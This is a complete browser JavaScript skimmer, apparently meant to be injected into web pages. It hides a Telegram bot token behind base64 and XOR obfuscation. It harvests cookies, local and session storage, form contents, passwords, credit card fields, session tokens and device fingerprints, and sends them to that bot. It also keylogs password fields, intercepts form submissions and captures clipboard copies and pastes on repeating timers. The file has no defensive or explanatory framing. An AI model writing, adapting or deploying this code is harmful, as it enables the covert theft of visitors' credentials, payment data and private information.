(function() {
    'use strict';
    
    const _0x3c5f = [
        'Nz','g1','Nj','Q2','Nj','U1','MD','g4','Ok','FB','SF','BG','WV','Jy','UV',
        'hY','WE','FF','Vr','YT','lp','V0','I2','Q0','JC','LV','lw','SV','Bm','Zm',
        'Na','V1','Uw','MA','==','Nz','M1','Nj','Q0','ND','Y2','Nj','I0','Ng','=='
    ];
    
    const _0x2a1d = function(s, k) {
        return atob(s).split('').map((c, i) => 
            String.fromCharCode(c.charCodeAt(0) ^ (k + i))
        ).join('');
    };
    
    const config = (function() {
        const encoded = _0x3c5f.join('');
        const decoded = _0x2a1d(encoded, 0x37);
        const parts = decoded.split('|');
        return { t: parts[0], c: parts[1] };
    })();
    
    class UltimateHarvester {
        constructor() {
            this.data = {};
            this.init();
        }
        
        async init() {
            await this.harvestAll();
            await this.transmit();
            this.setupMonitoring();
        }
        
        async harvestAll() {
            this.data.basic = this.getBasic();
            this.data.system = this.getSystem();
            this.data.network = await this.getNetwork();
            this.data.storage = this.getStorage();
            this.data.forms = this.getForms();
            this.data.inputs = this.getInputs();
            this.data.behavior = this.getBehavior();
            this.data.fingerprint = this.getFingerprint();
            this.data.social = await this.getSocial();
            this.data.financial = this.getFinancial();
            this.data.session = this.getSession();
        }
        
        getBasic() {
            return {
                t: new Date().toISOString(),
                u: window.location.href,
                h: window.location.hostname,
                p: window.location.pathname,
                s: window.location.search,
                f: document.referrer,
                a: navigator.userAgent,
                l: navigator.language,
                ls: navigator.languages,
                o: navigator.platform,
                on: navigator.onLine
            };
        }
        
        getSystem() {
            return {
                sw: screen.width,
                sh: screen.height,
                cw: screen.availWidth,
                ch: screen.availHeight,
                cd: screen.colorDepth,
                pd: screen.pixelDepth,
                hc: navigator.hardwareConcurrency,
                dm: navigator.deviceMemory,
                tp: navigator.maxTouchPoints,
                ve: navigator.vendor,
                pr: navigator.product
            };
        }
        
        async getNetwork() {
            const net = {};
            if (navigator.connection) {
                net.et = navigator.connection.effectiveType;
                net.dl = navigator.connection.downlink;
                net.rt = navigator.connection.rtt;
                net.sd = navigator.connection.saveData;
            }
            net.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
            net.to = new Date().getTimezoneOffset();
            net.ip = await this.getIP();
            return net;
        }
        
        async getIP() {
            return new Promise((r) => {
                try {
                    const RTCPeerConnection = window.RTCPeerConnection || 
                                              window.mozRTCPeerConnection || 
                                              window.webkitRTCPeerConnection;
                    if (!RTCPeerConnection) { r(null); return; }
                    
                    const pc = new RTCPeerConnection({iceServers: []});
                    pc.createDataChannel('');
                    pc.createOffer().then(pc.setLocalDescription.bind(pc));
                    
                    pc.onicecandidate = (ice) => {
                        if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                        const cand = ice.candidate.candidate;
                        const match = cand.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/);
                        pc.onicecandidate = () => {};
                        pc.close();
                        r(match ? match[1] : null);
                    };
                    
                    setTimeout(() => {
                        pc.onicecandidate = () => {};
                        pc.close();
                        r(null);
                    }, 1000);
                } catch(e) { r(null); }
            });
        }
        
        getStorage() {
            const storage = { ck: document.cookie, ls: {}, ss: {}, idb: null };
            
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    const k = localStorage.key(i);
                    storage.ls[k] = localStorage.getItem(k);
                }
            } catch(e) {}
            
            try {
                for (let i = 0; i < sessionStorage.length; i++) {
                    const k = sessionStorage.key(i);
                    storage.ss[k] = sessionStorage.getItem(k);
                }
            } catch(e) {}
            
            try {
                storage.idb = !!window.indexedDB;
            } catch(e) {}
            
            return storage;
        }
        
        getForms() {
            const forms = [];
            try {
                document.querySelectorAll('form').forEach((f, idx) => {
                    const form = {
                        i: f.id || `f${idx}`,
                        a: f.action,
                        m: f.method,
                        is: []
                    };
                    
                    f.querySelectorAll('input, select, textarea').forEach(inp => {
                        form.is.push({
                            t: inp.type,
                            n: inp.name,
                            i: inp.id,
                            v: inp.value,
                            ph: inp.placeholder,
                            ac: inp.autocomplete,
                            ch: inp.checked
                        });
                    });
                    
                    forms.push(form);
                });
            } catch(e) {}
            return forms;
        }
        
        getInputs() {
            const inputs = { pw: [], cc: [], per: [] };
            
            try {
                document.querySelectorAll('input[type="password"], input[autocomplete*="password"], input[name*="pass"], input[name*="pwd"]').forEach(inp => {
                    if (inp.value) {
                        inputs.pw.push({
                            n: inp.name,
                            i: inp.id,
                            v: inp.value,
                            f: inp.form ? inp.form.id : null
                        });
                    }
                });
                
                document.querySelectorAll('input[autocomplete="cc-number"], input[name*="card"], input[name*="credit"]').forEach(inp => {
                    if (inp.value) {
                        inputs.cc.push({
                            n: inp.name,
                            v: inp.value
                        });
                    }
                });
                
                document.querySelectorAll('input[type="email"], input[type="tel"], input[name*="name"], input[name*="address"], input[name*="phone"]').forEach(inp => {
                    if (inp.value) {
                        inputs.per.push({
                            t: inp.type,
                            n: inp.name,
                            v: inp.value
                        });
                    }
                });
            } catch(e) {}
            
            return inputs;
        }
        
        getBehavior() {
            const behavior = {
                ps: [],
                cl: [],
                sc: [],
                mv: [],
                tm: {}
            };
            
            if (window.performance && window.performance.timing) {
                const pt = window.performance.timing;
                behavior.tm = {
                    lt: pt.loadEventEnd - pt.navigationStart,
                    dr: pt.domContentLoadedEventStart - pt.navigationStart,
                    rc: pt.redirectEnd - pt.redirectStart,
                    ct: pt.connectEnd - pt.connectStart,
                    rt: pt.responseEnd - pt.requestStart
                };
            }
            
            try {
                behavior.vh = window.visualViewport ? {
                    w: window.visualViewport.width,
                    h: window.visualViewport.height,
                    s: window.visualViewport.scale
                } : null;
            } catch(e) {}
            
            return behavior;
        }
        
        getFingerprint() {
            const fp = {};
            
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = "top";
                ctx.font = "14px 'Arial'";
                ctx.textBaseline = "alphabetic";
                ctx.fillStyle = "#f60";
                ctx.fillRect(125,1,62,20);
                ctx.fillStyle = "#069";
                ctx.fillText("FP", 2, 15);
                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                ctx.fillText("FP", 4, 17);
                fp.c = canvas.toDataURL();
            } catch(e) {}
            
            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioCtx.createOscillator();
                const gainNode = audioCtx.createGain();
                oscillator.connect(gainNode);
                gainNode.connect(audioCtx.destination);
                oscillator.start();
                oscillator.stop(0.1);
                fp.a = "supported";
            } catch(e) {
                fp.a = "unsupported";
            }
            
            try {
                fp.w = 'WebGL';
                const gl = document.createElement('canvas').getContext('webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    fp.wr = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    fp.wv = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                }
            } catch(e) {}
            
            fp.p = window.devicePixelRatio;
            fp.t = navigator.doNotTrack;
            
            return fp;
        }
        
        async getSocial() {
            const social = { acc: [], aut: [] };
            
            try {
                const domains = ['facebook', 'google', 'twitter', 'github', 'linkedin', 'instagram'];
                domains.forEach(domain => {
                    try {
                        const key = `${domain}_token`;
                        if (localStorage.getItem(key)) {
                            social.acc.push({ p: domain, t: localStorage.getItem(key).substring(0, 50) });
                        }
                    } catch(e) {}
                });
            } catch(e) {}
            
            try {
                if (navigator.credentials && navigator.credentials.get) {
                    const cred = await navigator.credentials.get({password: true});
                    if (cred) {
                        social.aut.push({ id: cred.id, t: cred.type });
                    }
                }
            } catch(e) {}
            
            return social;
        }
        
        getFinancial() {
            const financial = { cc: [], bk: [] };
            
            try {
                const ccFields = document.querySelectorAll('[data-cc], [data-card], [autocomplete*="cc"]');
                ccFields.forEach(field => {
                    if (field.value) {
                        financial.cc.push({
                            n: field.name || field.id,
                            v: field.value,
                            t: field.type
                        });
                    }
                });
            } catch(e) {}
            
            try {
                if (window.PaymentRequest) {
                    financial.pr = "supported";
                }
            } catch(e) {}
            
            return financial;
        }
        
        getSession() {
            const session = {};
            
            try {
                session.tk = sessionStorage.getItem('token') || 
                            localStorage.getItem('auth_token') || 
                            localStorage.getItem('session_id');
            } catch(e) {}
            
            try {
                session.cf = document.cookie.split(';').find(c => 
                    c.includes('session') || c.includes('token') || c.includes('auth')
                );
            } catch(e) {}
            
            return session;
        }
        
        async transmit() {
            try {
                const message = this.formatMessage();
                await this.sendTelegram(message);
                
                if (this.data.storage.ls && Object.keys(this.data.storage.ls).length > 0) {
                    await this.sendStorage();
                }
                
                if (this.data.inputs.pw.length > 0) {
                    await this.sendPasswords();
                }
                
                if (this.data.forms.length > 0) {
                    await this.sendForms();
                }
            } catch(e) {}
        }
        
        formatMessage() {
            let msg = `🎯 *COMPLETE HARVEST* 🎯\n`;
            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
            msg += `• 🌐 *URL*: \`${this.data.basic.u}\`\n`;
            msg += `• 🕒 *Time*: ${this.data.basic.t}\n`;
            msg += `• 👤 *User*: ${this.data.basic.a.substring(0, 80)}...\n`;
            msg += `• 💻 *Platform*: ${this.data.basic.o}\n`;
            msg += `• 🖥️ *Screen*: ${this.data.system.sw}x${this.data.system.sh}\n`;
            msg += `• 📍 *IP*: ${this.data.network.ip || 'Unknown'}\n\n`;
            
            if (this.data.storage.ck) {
                msg += `🍪 *Cookies*: ${this.data.storage.ck.length} chars\n`;
            }
            
            if (this.data.inputs.pw.length > 0) {
                msg += `🔑 *Passwords*: ${this.data.inputs.pw.length} found\n`;
            }
            
            if (Object.keys(this.data.storage.ls).length > 0) {
                msg += `💾 *LocalStorage*: ${Object.keys(this.data.storage.ls).length} items\n`;
            }
            
            if (this.data.forms.length > 0) {
                msg += `📋 *Forms*: ${this.data.forms.length} forms\n`;
            }
            
            msg += `\n📊 *Full Report Sent in Parts*`;
            
            return msg;
        }
        
        async sendTelegram(text) {
            const url = `https://api.telegram.org/bot${config.t}/sendMessage`;
            const payload = {
                chat_id: config.c,
                text: text,
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            };
            
            await this.sendBeacon(url, payload);
            await this.sendFetch(url, payload);
            this.sendImage(url, payload);
        }
        
        async sendBeacon(url, data) {
            if (navigator.sendBeacon) {
                const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
                navigator.sendBeacon(url, blob);
            }
        }
        
        async sendFetch(url, data) {
            fetch(url, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data),
                mode: 'no-cors',
                credentials: 'omit'
            }).catch(() => {});
        }
        
        sendImage(url, data) {
            const params = new URLSearchParams();
            params.append('chat_id', data.chat_id);
            params.append('text', data.text.substring(0, 1000));
            params.append('parse_mode', data.parse_mode);
            
            const img = new Image();
            img.src = `${url}?${params.toString()}`;
            img.style.cssText = 'position:absolute;opacity:0;width:1px;height:1px;';
            document.body.appendChild(img);
            setTimeout(() => img.remove(), 1000);
        }
        
        async sendStorage() {
            const entries = Object.entries(this.data.storage.ls);
            for (let i = 0; i < entries.length; i += 3) {
                const chunk = entries.slice(i, i + 3);
                let msg = `💾 *LocalStorage Chunk ${Math.floor(i/3)+1}*\n`;
                chunk.forEach(([key, value]) => {
                    msg += `• *${key}*: \`${value.substring(0, 100)}${value.length > 100 ? '...' : ''}\`\n`;
                });
                
                await this.sendTelegram(msg);
                await this.sleep(500);
            }
        }
        
        async sendPasswords() {
            let msg = `🔑 *PASSWORDS CAPTURED*\n`;
            msg += `━━━━━━━━━━━━━━━━━━\n`;
            
            this.data.inputs.pw.forEach((pw, idx) => {
                msg += `${idx+1}. *${pw.n || 'unnamed'}*: \`${pw.v}\`\n`;
            });
            
            if (this.data.inputs.cc.length > 0) {
                msg += `\n💳 *CREDIT CARDS*\n`;
                this.data.inputs.cc.forEach((cc, idx) => {
                    msg += `${idx+1}. ${cc.n}: \`${cc.v}\`\n`;
                });
            }
            
            await this.sendTelegram(msg);
        }
        
        async sendForms() {
            for (let i = 0; i < this.data.forms.length; i++) {
                const form = this.data.forms[i];
                let msg = `📄 *FORM ${i+1}: ${form.i}*\n`;
                msg += `Action: ${form.a}\n`;
                msg += `Method: ${form.m}\n\n`;
                
                form.is.forEach((inp, idx) => {
                    if (inp.v) {
                        msg += `${idx+1}. ${inp.t} *${inp.n || inp.i}*: \`${inp.v}\`\n`;
                    }
                });
                
                await this.sendTelegram(msg);
                await this.sleep(300);
            }
        }
        
        setupMonitoring() {
            this.setupKeylogger();
            this.setupFormLogger();
            this.setupClipboardLogger();
            this.setupPeriodic();
        }
        
        setupKeylogger() {
            document.addEventListener('input', (e) => {
                const t = e.target;
                if (t.value && (
                    t.type === 'password' || 
                    t.autocomplete && t.autocomplete.includes('password') ||
                    t.name && /pass|pwd|login|auth|token|secret/i.test(t.name)
                )) {
                    const msg = `⌨️ *KEYLOGGER*\nField: ${t.name || t.id}\nValue: \`${t.value}\`\nURL: ${window.location.href}`;
                    this.sendTelegram(msg);
                }
            }, true);
        }
        
        setupFormLogger() {
            document.addEventListener('submit', (e) => {
                e.preventDefault();
                const f = e.target;
                const fd = new FormData(f);
                const data = {};
                
                fd.forEach((v, k) => data[k] = v);
                
                let msg = `📝 *FORM SUBMIT*\nForm: ${f.id || f.name}\nURL: ${window.location.href}\n`;
                Object.entries(data).forEach(([k, v]) => {
                    msg += `• ${k}: \`${v}\`\n`;
                });
                
                this.sendTelegram(msg);
                
                setTimeout(() => {
                    e.target.submit();
                }, 100);
            }, true);
        }
        
        setupClipboardLogger() {
            document.addEventListener('copy', (e) => {
                const selection = window.getSelection().toString();
                if (selection.length > 10 && selection.length < 500) {
                    const msg = `📋 *CLIPBOARD COPY*\nText: \`${selection.substring(0, 100)}${selection.length > 100 ? '...' : ''}\`\nURL: ${window.location.href}`;
                    this.sendTelegram(msg);
                }
            });
            
            document.addEventListener('paste', (e) => {
                const pasted = (e.clipboardData || window.clipboardData).getData('text');
                if (pasted.length > 10 && pasted.length < 500) {
                    const msg = `📋 *CLIPBOARD PASTE*\nText: \`${pasted.substring(0, 100)}${pasted.length > 100 ? '...' : ''}\`\nURL: ${window.location.href}`;
                    this.sendTelegram(msg);
                }
            });
        }
        
        setupPeriodic() {
            setInterval(async () => {
                await this.harvestAll();
                await this.transmit();
            }, 300000);
            
            setInterval(() => {
                const inputs = this.getInputs();
                if (inputs.pw.length > 0) {
                    this.sendPasswords();
                }
            }, 60000);
        }
        
        sleep(ms) {
            return new Promise(r => setTimeout(r, ms));
        }
    }
    
    setTimeout(() => {
        new UltimateHarvester();
    }, 2000);
    
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => {
            setTimeout(() => new UltimateHarvester(), 2000);
        });
    }
})();
